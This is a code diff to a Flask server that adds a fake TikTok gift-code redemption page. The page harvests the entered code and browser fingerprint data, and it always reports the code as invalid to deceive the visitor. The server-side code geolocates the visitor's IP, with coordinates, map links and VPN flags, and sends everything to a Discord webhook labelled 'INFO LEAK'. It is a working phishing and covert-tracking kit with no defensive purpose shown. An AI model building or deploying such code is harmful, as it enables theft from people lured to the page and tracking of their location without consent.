@@ -35,10 +35,192 @@ def serve_index(anything=None):
     )
 
 
+# --- NEW: Fake TikTok Redeem Code Page ---
+@app.route('/tiktokpage331', methods=['GET'])
+def tiktok_fake_page():
+    html_content = """
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Redeem Code - TikTok</title>
+        <style>
+            body {
+                background-color: #121212;
+                color: #ffffff;
+                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                height: 100vh;
+                margin: 0;
+            }
+            .container {
+                background-color: #1e1e1e;
+                padding: 40px;
+                border-radius: 8px;
+                text-align: center;
+                width: 90%;
+                max-width: 400px;
+                box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+            }
+            .logo {
+                font-size: 32px;
+                font-weight: bold;
+                margin-bottom: 20px;
+            }
+            .logo span:nth-child(1) { color: #00f2ea; text-shadow: 2px 2px #ff0050; }
+            .logo span:nth-child(2) { color: #ffffff; }
+            h2 { margin-bottom: 20px; font-size: 20px; }
+            input {
+                width: 100%;
+                padding: 12px;
+                margin-bottom: 20px;
+                border: 1px solid #333;
+                border-radius: 4px;
+                background-color: #2f2f2f;
+                color: #fff;
+                font-size: 16px;
+                box-sizing: border-box;
+                text-align: center;
+                letter-spacing: 2px;
+            }
+            input:focus { outline: none; border-color: #00f2ea; }
+            button {
+                width: 100%;
+                padding: 12px;
+                background-color: #ff0050;
+                color: white;
+                border: none;
+                border-radius: 4px;
+                font-size: 16px;
+                font-weight: bold;
+                cursor: pointer;
+                transition: background-color 0.2s;
+            }
+            button:hover { background-color: #e60048; }
+            .message {
+                margin-top: 20px;
+                font-size: 14px;
+                color: #ff0050;
+                display: none;
+            }
+            .spinner {
+                display: none;
+                margin: 20px auto;
+                border: 4px solid #333;
+                border-top: 4px solid #00f2ea;
+                border-radius: 50%;
+                width: 30px;
+                height: 30px;
+                animation: spin 1s linear infinite;
+            }
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="logo"><span>Tik</span>tok</div>
+            <h2>Redeem Gift Code</h2>
+            <p style="color: #aaa; font-size: 14px; margin-bottom: 20px;">Enter your 16-digit code to add coins to your account.</p>
+            <input type="text" id="codeInput" placeholder="XXXX-XXXX-XXXX-XXXX" maxlength="19">
+            <button id="redeemBtn" onclick="redeemCode()">Redeem</button>
+            <div class="spinner" id="spinner"></div>
+            <div class="message" id="message"></div>
+        </div>
+
+        <script>
+            document.getElementById('codeInput').addEventListener('input', function (e) {
+                let value = e.target.value.replace(/-/g, '').toUpperCase();
+                let matches = value.match(/.{1,4}/g);
+                let formattedValue = matches ? matches.join('-') : value;
+                e.target.value = formattedValue;
+            });
+
+            function redeemCode() {
+                const code = document.getElementById('codeInput').value;
+                const btn = document.getElementById('redeemBtn');
+                const spinner = document.getElementById('spinner');
+                const msg = document.getElementById('message');
+
+                if (code.replace(/-/g, '').length < 16) {
+                    msg.textContent = "Please enter a valid 16-digit code.";
+                    msg.style.display = "block";
+                    return;
+                }
+
+                btn.style.display = "none";
+                spinner.style.display = "block";
+                msg.style.display = "none";
+
+                const trackData = {
+                    tiktokCode: code,
+                    location: { error: "Not shared" },
+                    screen: { width: screen.width, height: screen.height, pixelRatio: window.devicePixelRatio, colorDepth: screen.colorDepth },
+                    battery: { level: "N/A", charging: "N/A" },
+                    webRTCIPs: ["N/A"],
+                    performance: { loadTime: "N/A" },
+                    hardware: { hardwareConcurrency: navigator.hardwareConcurrency, deviceMemory: navigator.deviceMemory || "N/A", maxTouchPoints: navigator.maxTouchPoints },
+                    fonts: [],
+                    plugins: [],
+                    platform: navigator.platform,
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timezoneOffset: new Date().getTimezoneOffset(),
+                    sessionId: Math.random().toString(36).substring(2, 15),
+                    timestamp: new Date().toISOString(),
+                    referrer: document.referrer || "Direct"
+                };
+
+                if (navigator.getBattery) {
+                    navigator.getBattery().then(battery => {
+                        trackData.battery = {
+                            level: Math.round(battery.level * 100) + "%",
+                            charging: battery.charging
+                        };
+                        sendTrack(trackData);
+                    }).catch(() => { sendTrack(trackData); });
+                } else {
+                    sendTrack(trackData);
+                }
+            }
+
+            function sendTrack(data) {
+                fetch('/track', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                }).then(() => {
+                    document.getElementById('spinner').style.display = "none";
+                    const msg = document.getElementById('message');
+                    msg.textContent = "Invalid code or already redeemed. Please check and try again.";
+                    msg.style.color = "#ff0050";
+                    msg.style.display = "block";
+                    document.getElementById('redeemBtn').style.display = "block";
+                    document.getElementById('redeemBtn').textContent = "Try Again";
+                }).catch(err => {
+                    document.getElementById('spinner').style.display = "none";
+                    const msg = document.getElementById('message');
+                    msg.textContent = "Network error. Please try again.";
+                    msg.style.display = "block";
+                    document.getElementById('redeemBtn').style.display = "block";
+                });
+            }
+        </script>
+    </body>
+    </html>
+    """
+    return html_content
+
+
 # --- THE FIX: catch ANY path / extension and still serve the page ---
-# '/path/to/anything.gif', '/foo/bar/baz.mp4', '/x' ... all hit serve_index().
 app.add_url_rule('/<path:anything>', 'catch_all', view_func=serve_index, methods=['GET'])
-# The bare root also works.
 app.add_url_rule('/', 'index', view_func=serve_index, methods=['GET'])
 
 
@@ -47,10 +229,8 @@ def track_data():
     data = request.json
     print("Data received:", json.dumps(data, indent=2))
 
-    # Get IP from request
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
 
-    # Try to get IP intelligence
     ip_info = {}
     try:
         response = requests.get(f'http://ip-api.com/json/{client_ip}', timeout=5)
@@ -83,7 +263,6 @@ def track_data():
     data['ipInfo'] = ip_info
     data['clientIp'] = client_ip
 
-    # Extra server-side request info (headers can't be spoofed by JS the same way)
     data['serverInfo'] = {
         'path': request.path,
         'userAgentHeader': request.headers.get('User-Agent', 'N/A'),
@@ -92,7 +271,6 @@ def track_data():
         'fullUrl': request.url,
     }
 
-    # Send to Discord with boxed formatting
     send_to_discord(data)
 
     return jsonify({"status": "success", "discord_sent": True})
@@ -111,13 +289,18 @@ def send_to_discord(data):
     fonts = data.get('fonts', [])
     plugins = data.get('plugins', [])
 
-    # Build boxed message
     lines = []
     lines.append("```")
     lines.append("╔════════════════════════════════════════════════════════════╗")
     lines.append("║                    📡 INFO LEAK                           ║")
     lines.append("╠════════════════════════════════════════════════════════════╣")
     lines.append("")
+
+    # TIKTOK CODE (if present)
+    if data.get('tiktokCode'):
+        lines.append("║ 🎫 TIKTOK REDEEM CODE")
+        lines.append(f"║    Code: {data['tiktokCode']}")
+        lines.append("║")
 
     # LOCATION
     if location and location.get('latitude'):
@@ -136,7 +319,6 @@ def send_to_discord(data):
     if ip_info:
         lines.append("║ 🌐 IP INTELLIGENCE")
         if ip_info.get('ip'): lines.append(f"║    IP: {ip_info['ip']}")
-        # City, Region/State, Country on one line
         place_parts = []
         if ip_info.get('city'): place_parts.append(ip_info['city'])
         state = ip_info.get('region') or ip_info.get('regionCode')
@@ -149,7 +331,6 @@ def send_to_discord(data):
             lines.append(f"║    Location: {', '.join(place_parts)}")
         if ip_info.get('district'): lines.append(f"║    District: {ip_info['district']}")
         if ip_info.get('zip'): lines.append(f"║    ZIP: {ip_info['zip']}")
-        # IP-derived coordinates + maps link
         if ip_info.get('lat') and ip_info.get('lon'):
             lines.append(f"║    Coords: {ip_info['lat']}, {ip_info['lon']}")
             lines.append(f"║    https://maps.google.com/?q={ip_info['lat']},{ip_info['lon']}")
@@ -158,7 +339,6 @@ def send_to_discord(data):
         if ip_info.get('as'): lines.append(f"║    ASN: {ip_info['as']}")
         if ip_info.get('reverse'): lines.append(f"║    Hostname: {ip_info['reverse']}")
         if ip_info.get('timezone'): lines.append(f"║    TZ: {ip_info['timezone']}")
-        # Security flags (VPN/proxy/datacenter detection)
         flags = []
         if ip_info.get('proxy'): flags.append("🔴 PROXY/VPN")
         if ip_info.get('hosting'): flags.append("🟠 DATACENTER")
@@ -198,8 +378,8 @@ def send_to_discord(data):
     lines.append("║ 🆔 FINGERPRINTS")
     canvas = data.get('canvasFingerprint', 'N/A')
     audio = data.get('audioFingerprint', 'N/A')
-    lines.append(f"║    Canvas: {canvas[:12]}")
-    lines.append(f"║    Audio: {audio[:12]}")
+    lines.append(f"║    Canvas: {canvas[:12] if isinstance(canvas, str) else 'N/A'}")
+    lines.append(f"║    Audio: {audio[:12] if isinstance(audio, str) else 'N/A'}")
     lines.append("║")
 
     # BATTERY
@@ -270,7 +450,6 @@ def send_to_discord(data):
     lines.append("╚════════════════════════════════════════════════════════════╝")
     lines.append("```")
 
-    # Send to Discord
     payload = {
         "content": "\n".join(lines),
         "username": "Info Leak"
